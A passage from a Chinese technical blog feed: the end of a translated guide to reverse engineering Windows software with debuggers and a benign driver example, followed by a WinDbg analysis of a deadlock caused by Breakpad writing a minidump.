<p><a href="http://www.rohitab.com/apimonitor" target="_blank" rel="external">API Monitor</a>是非常实用的工具，用于发现应用程序调用了哪些API以及应用程序从这些API期望的行为。该工具具有功能强大的数据库，可让您看到对不仅是kernel32和ntdll的大量API函数的调用，而且还包括对COM，托管环境等的调用。此外，API Monitor提供了方便的过滤机制。</p>
<h3 id="调试器">调试器</h3><p>对于任何开发人员来说，调试器对于查看程序现在正在做什么时无可替代的。逆向应用程序时从调试中获得的好处与调试实时应用程序时获得的好处相同。<br>最受欢迎的调试器是OllyDbg，WinDbg和Windbg Preview。</p>
<p><strong>OllyDbg</strong></p>
<div align="center"><br><img src="/img/reverse_ollydbg.png" alt="OllyDbg" align="center"><br></div><br>当涉及软件逆向工程时，OllyDbg（及其后继x64dbg）可能是最好的调试器。它是专门为满足逆向需求而开发的，并具有用于此目的的所有功能：<br><br>- 内置的反汇编程序，能够分析和识别关键数据结构<br>- 导入和导出分析功能<br>- 内置的assembling和patching引擎<br>解析API函数及其参数的能力使逆向系统的交互变得容易。堆栈视图提供了大量有关调用堆栈的信息。另一个重要的优点是，可以实用OllyDbg调试有调试保护的应用程序，而普通的调试器却无能为力。<br><br><strong>WinDbg</strong><br><div align="center"><br><img src="/img/reverse_Windbg.png" alt="Windbg" align="center"><br></div>

<p>尽管界面简单，但<a href="http://www.windbg.org/" target="_blank" rel="external">WinDbg</a>具有强大的调试工具。它具有内置的反汇编程序，各种命令，可让您几乎了解要调试的进程/系统的所有内容，并具有内核模式调试的能力，这可能是最有价值的功能。对于逆向驱动程序，尤其是内核模式驱动程序，这是一个很大的优势。</p>
<p><strong>Windbg Preview</strong></p>
<div align="center"><br><img src="/img/reverse_Windbg_Preview.jpg" alt="Windbg Preview" align="center"><br></div><br>Windbg Preview是Microsoft开发的Windbg的新版本。它仅通过Windows应用商店分发。它具有经典Windbg的所有功能以及新的UI和一些新功能。这些新功能之一是Time Travel Debugging，它使您可以记录一段程序执行时间，然后根据需要重复调试多次。这样您可以通过逐步执行代码中所关心的部分，而不必担心意外运行某些代码并丢失上下文或所有数据。<br><br>## 0x04 现实中的软件逆向工程示例<br><br>现在，我们将看到一个示例，说明如何对软件进行逆向工程。假设您有一个可疑的可执行文件。您需要了解该程序的功能以及对用户而言是否安全。考虑到这种情况，最好不要在工作计算机上运行此可执行文件，而要使用虚拟机。让我们在虚拟机中启动应用程序。<br><div align="center"><br><img src="/img/reverse_CreateService.png" alt="Process creates a service" align="center"><br></div><br>如我们所见，该文件创建一个名为TestDriver的Windows服务，为内核类型，因此我们知道它是一个驱动程序。但是从哪里获取驱动程序文件才能运行？我们可以使用Sysinternals Suite中的ProcessMonitor进行查找。打开ProcessMonitor时，我们可以设置过滤器以仅向我们显示感兴趣的文件活动。其活动日志如下所示：<br><div align="center"><br><img src="/img/reverse_filemon.png" alt="FileMon information" align="center"><br></div>

<p>驱动程序文件是由我们所要进行的逆向的程序创建的，该程序将该文件放置在用户的temp目录中。无需在temp文件夹中查找文件，因为我们发现该过程会在使用后立即将其删除。那么该文件干了什么呢？如果将文件解压缩，我们可能会尝试在流程的资源部分中找到它，因为这是存储此类数据的常用位置。让我们看看那里。我们将使用另一个工具-<a href="http://www.angusj.com/resourcehacker/" target="_blank" rel="external">Resource Hacker</a>-检查资源。运行它：</p>
<p><div align="center"><br><img src="/img/reverse_reshack.png" alt="使用Resource Hacker检查资源" align="center"><br></div><br>找到了，我们在资源文件中找到了，这可能是Windows可执行文件，因为它以MZ签名开头并且具有字符串“This program cannot be run in DOS mode”。让我们检查一下它是否是我们的驱动程序文件。为此，我们使用Resource Hacker提取资源，然后在反汇编程序中将其打开。</p>
<p><div align="center"><br><img src="/img/reverse_disdrv.png" alt align="center"><br></div><br>众所周知，DriverEntry是Windows系统中内核模式驱动程序的入口点。似乎我们找到的时一个驱动程序文件，因此我们可以继续进行研究。</p>
<h2 id="0x05_如何对驱动程序进行反向工程">0x05 如何对驱动程序进行反向工程</h2><p>要开始对驱动程序进行逆向工程，我们逐一检查从DriverEntry调用的函数。转到sub_14005，没有发现任何有趣的事情，因此我们继续进行sub_110F0并找到以下代码：</p>
<p><div align="center"><br><img src="/img/reverse_assdiver.png" alt align="center"><br></div><br>为了简单起见，此处省略了一些信息。<br>在第一个代码清单中，创建了一个unicode字符串，该字符串指向路径C:\hello.txt。之后，结构OBJECT_ATTRIBUTES填充了常规值；我们知道在调用ZwCreateFile之类的函数时通常需要此结构。<br>在第二个清单中，我们看到确实调用了ZwCreateFile，这使我们非常确定驱动程序已创建文件-并且我们知道该文件在创建之后的位置。<br>从第三和第四代码清单中可以看到，驱动程序采用unicode字符串并将其写入缓冲区（这在sub_11150函数中发生），然后将使用ZwWriteFile函数将缓冲区写入文件。最后，驱动程序使用ZwClose API关闭文件。<br>让我们总结一下。我们发现原始程序从其资源中提取了驱动程序文件，并将其放入当前用户的临时文件夹中，为此驱动程序创建Windows服务并运行它。之后，程序将停止并从temp目录中删除服务和原始驱动程序文件。从这种行为和对反汇编的分析来看，驱动程序除了在C盘中创建一个名为hello.txt的文件并写入字符串“Hello from driver”外，什么都不做。</p>
<p><div align="center"><br><img src="/img/htre-win-13.png" alt align="center"><br></div><br>精彩！我们已经对该简单程序进行了逆向工程，现在我们知道它可以安全使用。我们可以通过许多不同的方式实现此结果-使用调试或API Mon，编写测试等。您可以找到自己的方式来对适合您的软件进行逆向工程。</p>
<h2 id="0x06_结论">0x06 结论</h2><p>Windows软件逆向工程需要扎实的教育背景和编程经验。为了开始逆向工程，您需要结合汇编，网络监控，调试，API集成，多种程序语言，编译器等方面的技能。在逆转软件时还必须非常小心，以免违反版权法或损害版权及你的操作系统。</p>
<p><em>原文地址：<a href="https://www.apriorit.com/dev-blog/364-how-to-reverse-engineer-software-windows-in-a-right-way" target="_blank" rel="external">https://www.apriorit.com/dev-blog/364-how-to-reverse-engineer-software-windows-in-a-right-way</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>你有没有想过要拆开某个机械装置了解它的工作原理呢？嗯，谁没有呢。这种欲望也是是逆向工程的主导力量，逆向对于分析产品安全性、在不运行可疑的.exe文件的情况下查明其用途、恢复丢失的文档、开发基于旧软件的新解决方案等非常有用。<br>]]>
    
    </summary>
    
      <category term="Windows" scheme="http://www.youngroe.com/tags/Windows/"/>
    
      <category term="逆向" scheme="http://www.youngroe.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows平台下一个崩溃而导致的死锁分析]]></title>
    <link href="http://www.youngroe.com/2019/01/12/Windows/a_crash_lead_deadlock/"/>
    <id>http://www.youngroe.com/2019/01/12/Windows/a_crash_lead_deadlock/</id>
    <published>2019-01-12T12:13:53.000Z</published>
    <updated>2020-02-15T07:54:24.198Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_问题介绍">0x00 问题介绍</h2><p>测试反馈测试过程中发现程序进程存在但是界面没加载出来，看现场很快发现是因为版本不匹配而导致程序崩溃，在写dmp的过程中死锁而导致进程卡死，由于程序是卡死而非退出守护进程也未重启程序，最终导致界面一直没加载出来。<br>现象就如上面所说，但是为什么写dmp为什么会导致程序死锁呢？<br><a id="more"></a></p>
<h2 id="0x01_初探死锁原因">0x01 初探死锁原因</h2><p>首先我们来看下程序死锁时线程状态，分析下死锁原因：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">0</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0061</span>c8cc <span class="number">751</span>a15bf <span class="number">00000138</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!NtWaitForSingleObject+<span class="number">0x15</span> (FPO: [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line"><span class="number">0061</span>c938 <span class="number">770e1194</span> <span class="number">00000138</span> ffffffff <span class="number">00000000</span> KERNELBASE!WaitForSingleObjectEx+<span class="number">0x98</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c950 <span class="number">770e1148</span> <span class="number">00000138</span> ffffffff <span class="number">00000000</span> kernel32!WaitForSingleObjectExImplementation+<span class="number">0x75</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c964 <span class="number">6</span>c710cbb <span class="number">00000138</span> ffffffff <span class="number">6</span>c71092f kernel32!WaitForSingleObject+<span class="number">0x12</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c978 <span class="number">6</span>c710983 <span class="number">0061</span>ca54 <span class="number">00000000</span> <span class="number">6</span>c71092f xxx!google_breakpad::ExceptionHandler::WriteMinidumpOnHandlerThread+<span class="number">0x64</span> (FPO: [<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]) (CONV: thiscall) </span><br><span class="line"><span class="number">0061</span>c994 <span class="number">7712030</span>d <span class="number">0061</span>ca24 <span class="number">7712031f</span> <span class="number">0061</span>ca54 xxx!google_breakpad::ExceptionHandler::HandleException+<span class="number">0x54</span> (FPO: [Non-Fpo]) (CONV: thiscall) </span><br><span class="line"><span class="number">0061</span>ca24 <span class="number">77686637</span> <span class="number">0061</span>ca54 <span class="number">77686514</span> <span class="number">00000000</span> kernel32!UnhandledExceptionFilter+<span class="number">0x119</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>ca2c <span class="number">77686514</span> <span class="number">00000000</span> <span class="number">0061f</span>a04 <span class="number">7763</span>c6b0 ntdll!__RtlUserThreadStart+<span class="number">0x62</span> (FPO: [SEH])</span><br><span class="line"><span class="number">0061</span>ca40 <span class="number">776863</span>b1 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!_EH4_CallFilterFunc+<span class="number">0x12</span> (FPO: [Uses EBP] [<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>])</span><br><span class="line"><span class="number">0061</span>ca68 <span class="number">7766</span>b81d fffffffe <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!_except_handler4+<span class="number">0x8e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>ca8c <span class="number">7766</span>b7ef <span class="number">0061</span>cb54 <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!ExecuteHandler2+<span class="number">0x26</span> (FPO: [Uses EBP] [<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>])</span><br><span class="line"><span class="number">0061</span>cab0 <span class="number">7766</span>b790 <span class="number">0061</span>cb54 <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!ExecuteHandler+<span class="number">0x24</span> (FPO: [<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>])</span><br><span class="line"><span class="number">0061</span>cb3c <span class="number">77620163</span> <span class="number">0061</span>cb54 <span class="number">0061</span>cba4 <span class="number">0061</span>cb54 ntdll!RtlDispatchException+<span class="number">0x127</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>cb3c <span class="number">00000000</span> <span class="number">0061</span>cb54 <span class="number">0061</span>cba4 <span class="number">0061</span>cb54 ntdll!KiUserExceptionDispatcher+<span class="number">0xf</span> (FPO: [<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]) (CONTEXT @ <span class="number">00000008</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; .exr <span class="number">0061</span>cb54 </span><br><span class="line">ExceptionAddress: <span class="number">7519</span>c52f (KERNELBASE!RaiseException+<span class="number">0x00000058</span>)</span><br><span class="line">   ExceptionCode: e06d7363 (C++ EH exception)</span><br><span class="line">  ExceptionFlags: <span class="number">00000001</span></span><br><span class="line">NumberParameters: <span class="number">3</span></span><br><span class="line">   Parameter[<span class="number">0</span>]: <span class="number">19930520</span></span><br><span class="line">   Parameter[<span class="number">1</span>]: <span class="number">0061</span>d0a0</span><br><span class="line">   Parameter[<span class="number">2</span>]: <span class="number">6</span>d376990</span><br><span class="line">  pExceptionObject: <span class="number">0061</span>d0a0</span><br><span class="line">  _s_ThrowInfo    : <span class="number">6</span>d376990</span><br><span class="line">  Type            : <span class="keyword">class</span> <span class="built_in">std</span>::bad_alloc</span><br><span class="line">  Type            : <span class="keyword">class</span> <span class="built_in">std</span>::exception</span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; .cxr <span class="number">0061</span>cba4 </span><br><span class="line">eax=<span class="number">0061</span>d008 ebx=<span class="number">0061</span>d0e4 ecx=<span class="number">00000003</span> edx=<span class="number">00000000</span> esi=<span class="number">3f</span>ffffef edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">7519</span>c52f esp=<span class="number">0061</span>d008 ebp=<span class="number">0061</span>d058 iopl=<span class="number">0</span>         nv up ei pl nz ac po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000212</span></span><br><span class="line">KERNELBASE!RaiseException+<span class="number">0x58</span>:</span><br><span class="line"><span class="number">7519</span>c52f c9              leave</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Qt5Core.dll - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Desktop.exe - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Qt5Widgets.dll - </span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; kv</span><br><span class="line">  *** Stack trace <span class="keyword">for</span> last <span class="built_in">set</span> context - .thread/.cxr resets it</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0061</span>d058 <span class="number">6f</span>e4872d e06d7363 <span class="number">00000001</span> <span class="number">00000003</span> KERNELBASE!RaiseException+<span class="number">0x58</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>d090 <span class="number">6</span>d0a6956 <span class="number">0061</span>d0a0 <span class="number">6</span>d376990 <span class="number">6</span>d2516d4 msvcr100!_CxxThrowException+<span class="number">0x48</span> (FPO: [Non-Fpo])</span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">0061</span>d0ac <span class="number">6</span>d0b888b <span class="number">07</span>cb37f8 <span class="number">07</span>cb37f8 <span class="number">00000000</span> Qt5Core!qBadAlloc+<span class="number">0x1c</span></span><br><span class="line"><span class="number">0061</span>d0f4 <span class="number">00285f</span>be <span class="number">0061</span>d11c <span class="number">3f</span>ffffef <span class="number">00000000</span> Qt5Core!QByteArray::resize+<span class="number">0x96</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; !handle <span class="number">0x138</span> <span class="number">0xf</span></span><br><span class="line">Handle <span class="number">00000138</span></span><br><span class="line">  Type         	Semaphore</span><br><span class="line">  Attributes   	<span class="number">0</span></span><br><span class="line">  GrantedAccess	<span class="number">0x1f0003</span>:</span><br><span class="line">         Delete,ReadControl,WriteDac,WriteOwner,Synch</span><br><span class="line">         QueryState,ModifyState</span><br><span class="line">  HandleCount  	<span class="number">2</span></span><br><span class="line">  PointerCount 	<span class="number">4</span></span><br><span class="line">  Name         	&lt;none&gt;</span><br><span class="line">  No object specific information available</span><br></pre></td></tr></table></figure></p>
<p>首先看下主线程，主线程因为bad_alloc主动触发异常被breakpad捕获到在创建dmp文件，并通过WaitForsingleObject等待句柄值为0x138的信号量释放。这里可以回到breakpad的源码，可以发现breakpad中是通过信号量控制ExceptionHandlerThreadMain线程生成dmp，此刻是通过WaitForSingleObject等待ExceptionHandlerThreadMain线程完成dmp生成。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This causes the handler thread to call WriteMinidumpWithException.</span></span><br><span class="line">ReleaseSemaphore(handler_start_semaphore_, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until WriteMinidumpWithException is done and collect its return value.</span></span><br><span class="line">WaitForSingleObject(handler_finish_semaphore_, INFINITE);</span><br><span class="line"><span class="keyword">bool</span> status = handler_return_value_;</span><br></pre></td></tr></table></figure></p>
<p>那我们再看下线程ExceptionHandlerThreadMain在干嘛，怎么一直没有完成dmp文件生成，释放信号量？<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">4</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">02f</span>3f1fc <span class="number">7764</span>db13 <span class="number">00000730</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!NtWaitForSingleObject+<span class="number">0x15</span> (FPO: [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line"><span class="number">02f</span>3f260 <span class="number">7764</span>d9f7 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03</span>d20000 ntdll!RtlpWaitOnCriticalSection+<span class="number">0x13e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f288 <span class="number">7764</span>dc78 <span class="number">03</span>d20138 <span class="number">759</span>b9beb <span class="number">00078000</span> ntdll!RtlEnterCriticalSection+<span class="number">0x150</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f364 <span class="number">77643541</span> <span class="number">00001f</span>f8 <span class="number">00002000</span> <span class="number">00000000</span> ntdll!RtlpAllocateHeap+<span class="number">0x159</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f3e8 <span class="number">77647</span>d7b <span class="number">03</span>d20000 <span class="number">00800000</span> <span class="number">00001f</span>f8 ntdll!RtlAllocateHeap+<span class="number">0x23a</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f434 <span class="number">77647271</span> <span class="number">00000388</span> <span class="number">759</span>b9c4b <span class="number">0767</span>d8e0 ntdll!RtlpAllocateUserBlock+<span class="number">0xae</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f4c4 <span class="number">7763e262</span> <span class="number">0767</span>d8e0 <span class="number">02f</span>3faac <span class="number">02f</span>3faac ntdll!RtlpLowFragHeapAllocFromContext+<span class="number">0x802</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f538 <span class="number">73e1</span>bad5 <span class="number">03</span>d20000 <span class="number">00000008</span> <span class="number">00000374</span> ntdll!RtlAllocateHeap+<span class="number">0x206</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f54c <span class="number">73e16</span>d52 <span class="number">00000374</span> <span class="number">0767</span>d8e0 <span class="number">02f</span>3faac dbghelp!Win32LiveAllocationProvider::Alloc+<span class="number">0x13</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f560 <span class="number">73e16</span>e96 <span class="number">02f</span>3faac <span class="number">00000374</span> <span class="number">0767</span>d8e0 dbghelp!AllocMemory+<span class="number">0x15</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f598 <span class="number">73e1</span>a261 <span class="number">02f</span>3faac <span class="number">0767</span>d8e0 <span class="number">000018</span>b4 dbghelp!GenAllocateThreadObject+<span class="number">0x2d</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3f9c0 <span class="number">73e15</span>b81 <span class="number">02f</span>3faac <span class="number">02f</span>3fb60 <span class="number">02f</span>3fb78 dbghelp!GenGetProcessInfo+<span class="number">0xf2</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fb40 <span class="number">73e15</span>e2a ffffffff <span class="number">00001</span>bd0 <span class="number">03</span>d207e8 dbghelp!MiniDumpProvideDump+<span class="number">0x16b</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fba8 <span class="number">6</span>c71101a ffffffff <span class="number">00001</span>bd0 <span class="number">00000728</span> dbghelp!MiniDumpWriteDump+<span class="number">0xf2</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fc70 <span class="number">6</span>c710db2 <span class="number">00000720</span> <span class="number">00000000</span> ffffffff xxx!google_breakpad::ExceptionHandler::WriteMinidumpWithExceptionForProcess+<span class="number">0x1e3</span> (FPO: [Non-Fpo]) </span><br><span class="line"><span class="number">02f</span>3fc8c <span class="number">6</span>c710875 <span class="number">00000720</span> <span class="number">0061</span>ca54 <span class="number">00000000</span> xxx!google_breakpad::ExceptionHandler::WriteMinidumpWithException+<span class="number">0x43</span> (FPO: [Non-Fpo]) </span><br><span class="line"><span class="number">02f</span>3fca0 <span class="number">770e338</span>a <span class="number">02811098</span> <span class="number">02f</span>3fcec <span class="number">77649</span>a02 xxx!google_breakpad::ExceptionHandler::ExceptionHandlerThreadMain+<span class="number">0x39</span> (FPO: [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]) </span><br><span class="line"><span class="number">02f</span>3fcac <span class="number">77649</span>a02 <span class="number">02811098</span> <span class="number">759</span>b9463 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0xe</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fcec <span class="number">776499</span>d5 <span class="number">6</span>c71083c <span class="number">02811098</span> <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">02f</span>3fd04 <span class="number">00000000</span> <span class="number">6</span>c71083c <span class="number">02811098</span> <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span> (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到ExceptionHandlerThreadMain线程果然正在写dmp，但是为什么一直没有完成了？原来是在等待获取一个临界区0x3d20138啊，看下这个临界区被谁占用了呢<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; !cs <span class="number">03</span>d20138 </span><br><span class="line">-----------------------------------------</span><br><span class="line">Critical section   = <span class="number">0x03d20138</span> (+<span class="number">0x3D20138</span>)</span><br><span class="line">DebugInfo          = <span class="number">0x00810238</span></span><br><span class="line">LOCKED</span><br><span class="line">LockCount          = <span class="number">0x1</span></span><br><span class="line">WaiterWoken        = No</span><br><span class="line">OwningThread       = <span class="number">0x00001770</span></span><br><span class="line">RecursionCount     = <span class="number">0x1</span></span><br><span class="line">LockSemaphore      = <span class="number">0x730</span></span><br><span class="line">SpinCount          = <span class="number">0x00000fa0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~~[<span class="number">0x1770</span>]</span><br><span class="line">  <span class="number">12</span>  Id: <span class="number">1</span>bd0<span class="number">.1770</span> Suspend: <span class="number">2</span> Teb: <span class="number">7</span>ef93000 Unfrozen</span><br><span class="line">      Priority: <span class="number">0</span>  Priority <span class="keyword">class</span>: <span class="number">32</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">12</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">03f</span>cf388 <span class="number">776</span>cfbc7 <span class="number">00720000</span> <span class="number">00000005</span> <span class="number">776</span>b4acb ntdll!RtlpQueryExtendedInformationHeap+<span class="number">0x4ec</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf408 <span class="number">776</span>d079f <span class="number">00000005</span> <span class="number">776</span>b4acb <span class="number">03f</span>cf590 ntdll!RtlpQueryExtendedInformationAllHeaps+<span class="number">0xe5</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf4f8 <span class="number">7769e2</span>b6 <span class="number">03f</span>cf564 <span class="number">776</span>b4acb <span class="number">00000000</span> ntdll!RtlpQueryExtendedHeapInformation+<span class="number">0xe7</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf538 <span class="number">776</span>b5163 <span class="number">00000000</span> <span class="number">00000002</span> <span class="number">03f</span>cf564 ntdll!RtlQueryHeapInformation+<span class="number">0x4a</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf5dc <span class="number">7769374</span>a <span class="number">0</span>a0a0000 <span class="number">770</span>d0000 <span class="number">03f</span>cf6a4 ntdll!RtlQueryProcessHeapInformation+<span class="number">0x288</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf658 <span class="number">77166093</span> <span class="number">00001</span>bd0 <span class="number">00000014</span> <span class="number">0</span>a0a0000 ntdll!RtlQueryProcessDebugInformation+<span class="number">0x28a</span> (FPO: [Non-Fpo])</span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> libeay32.dll</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> libeay32.dll - </span><br><span class="line"><span class="number">03f</span>cf688 <span class="number">6</span>c38a953 <span class="number">0</span>a0a0000 <span class="number">5205</span>b472 <span class="number">00000001</span> kernel32!Heap32Next+<span class="number">0x4d</span> (FPO: [Non-Fpo])</span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">03f</span>cf730 <span class="number">7764</span>b83d <span class="number">03f</span>cf7cc <span class="number">00000001</span> <span class="number">751</span>d11e4 libeay32!RAND_poll+<span class="number">0x583</span></span><br><span class="line"><span class="number">03f</span>cf7dc <span class="number">6</span>c331cef <span class="number">0000000</span>a <span class="number">00000001</span> <span class="number">6</span>c408268 ntdll!SbpTraceSbImpl+<span class="number">0x4e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">03f</span>cf7f4 <span class="number">6</span>c331d3b <span class="number">0000000</span>a <span class="number">00000001</span> <span class="number">6</span>c408268 libeay32!CRYPTO_lock+<span class="number">0x6f</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> libeay32!CRYPTO_add_lock+<span class="number">0x3b</span></span><br></pre></td></tr></table></figure></p>
<p>原来临界区03d20138还在被12号线程线程占用着啊，那为什么一直不释放呢？12号线程也没有获取什么资源啊，通过栈看只是在查询堆信息啊，百思不得其解。看看线程状态呢，Suspend 2表示线程该线程被挂起了2次（不清楚可以看下SuspendThread的MSDN），其中一次是挂调试器引起的，那另外一次呢？ 猜测可能是breakpad或则系统函数在写dmp的过程中执行的，因为通过挂起线程便于保存当前进程线程的上下文到dmp文件中。<br>最终发现是在执行系统函数MiniDumpWriteDump时执行的挂起线程操作。在GenAllocateThreadObject函数中执行SuspendThread挂起线程，在GenFreeProcessObject中执行ResumeThread恢复线程执行。</p>
